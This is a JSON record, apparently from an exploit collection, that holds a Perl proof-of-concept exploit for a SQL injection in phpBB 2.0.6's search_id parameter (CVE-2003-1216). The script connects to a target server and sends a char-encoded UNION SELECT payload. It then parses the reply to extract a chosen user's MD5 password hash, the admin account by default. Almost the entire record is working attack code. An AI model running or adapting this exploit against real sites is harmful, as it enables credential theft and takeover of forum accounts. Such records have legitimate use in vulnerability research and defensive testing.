{
  "id": "137",
  "title": "phpBB 2.0.6 - &#039;search_id&#039; SQL Injection / MD5 Hash",
  "cve": "CVE-2003-1216",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\nuse IO::Socket;\r\n##    PROOF-OF-CONCEPT\r\n##    * work only with mysql ver > 4.0\r\n##    * work only with post #1 \r\n##\r\n##    Example:\r\n##    C:\\>r57phpbb-poc.pl 127.0.0.1 phpBB2 2 2\r\n##    [~] prepare to connect...\r\n##    [+] connected\r\n##    [~] prepare to send data...\r\n##    [+] OK\r\n##    [~] wait for response...\r\n##    [+] MD5 Hash for user with id=2 is: 5f4dcc3b5aa765d61d8327deb882cf99\r\n##\r\nif (@ARGV < 4)\r\n{\r\nprint \"\\n\\n\";\r\nprint \"|****************************************************************|\\n\";\r\nprint \" r57phpbb.pl\\n\";\r\nprint \" phpBB v<=2.06 search_id sql injection exploit (POC version)\\n\";\r\nprint \" by RusH security team // www.rsteam.ru , http://rst.void.ru\\n\";\r\nprint \" coded by f3sy1 & 1dt.w0lf // 16/12/2003\\n\";\r\nprint \" Usage: r57phpbb-poc.pl <server> <folder> <user_id> <search_id>\\n\";\r\nprint \" e.g.: r57phpbb-poc.pl 127.0.0.1 phpBB2 2 2\\n\";\r\nprint \" [~] <server> - server ip\\n\";\r\nprint \" [~] <folder> - forum folder\\n\";\r\nprint \" [~] <user_id> - user id (2 default for phpBB admin)\\n\";\r\nprint \" [~] <search_id> - play with this value for results\\n\";\r\nprint \"|****************************************************************|\\n\";\r\nprint \"\\n\\n\";\r\nexit(1);\r\n}\r\n$success = 0;\r\n$server = $ARGV[0];\r\n$folder = $ARGV[1];\r\n$user_id = $ARGV[2];\r\n$search_id = $ARGV[3];\r\nprint \"[~] prepare to connect...\\n\";\r\n$socket = IO::Socket::INET->new(\r\nProto => \"tcp\",\r\nPeerAddr => \"$server\",\r\nPeerPort => \"80\") || die \"$socket error $!\";\r\nprint \"[+] connected\\n\";\r\nprint \"[~] prepare to send data...\\n\";\r\n# PROOF-OF-CONCEPT reguest...\r\nprint $socket \"GET /$folder/search.php?search_id=$search_id%20union%20select%20concat\r\n(char(97,58,55,58,123,115,58,49,52,58,34,115,101,97,114,99,104,95,114,101,115,117,108,\r\n116,115,34,59,115,58,49,58,34,49,34,59,115,58,49,55,58,34,116,111,116,97,108,95,109,\r\n97,116,99,104,95,99,111,117,110,116,34,59,105,58,53,59,115,58,49,50,58,34,115,112,108,\r\n105,116,95,115,101,97,114,99,104,34,59,97,58,49,58,123,105,58,48,59,115,58,51,50,58,34)\r\n,user_password,char(34,59,125,115,58,55,58,34,115,111,114,116,95,98,121,34,59,105,58,48,\r\n59,115,58,56,58,34,115,111,114,116,95,100,105,114,34,59,115,58,52,58,34,68,69,83,67,34,\r\n59,115,58,49,50,58,34,115,104,111,119,95,114,101,115,117,108,116,115,34,59,115,58,54,\r\n58,34,116,111,112,105,99,115,34,59,115,58,49,50,58,34,114,101,116,117,114,110,95,99,\r\n104,97,114,115,34,59,105,58,50,48,48,59,125))%20from%20phpbb_users%20where%20user_id=$user_id/*\r\nHTTP/1.0\\r\\n\\r\\n\";\r\nprint \"[+] OK\\n\";\r\nprint \"[~] wait for response...\\n\";\r\nwhile ($answer = <$socket>)\r\n{\r\nif ($answer =~ /;highlight=/)\r\n{\r\n$success = 1;\r\n@result=split(/;/,$answer);\r\n@result2=split(/=/,$result[1]);\r\n$result2[1]=~s/&amp/ /g;\r\nprint \"[+] MD5 Hash for user with id=$user_id is: $result2[1]\\n\";\r\n}\r\n}\r\nif ($success==0) {print \"[-] exploit failed =(\\n\";}\r\n## o---[ RusH security team | www.rsteam.ru | 2003 ]---o\r\n\r\n\r\n# milw0rm.com [2003-12-21]",
  "url": "https://www.exploit-db.com/exploits/137"
}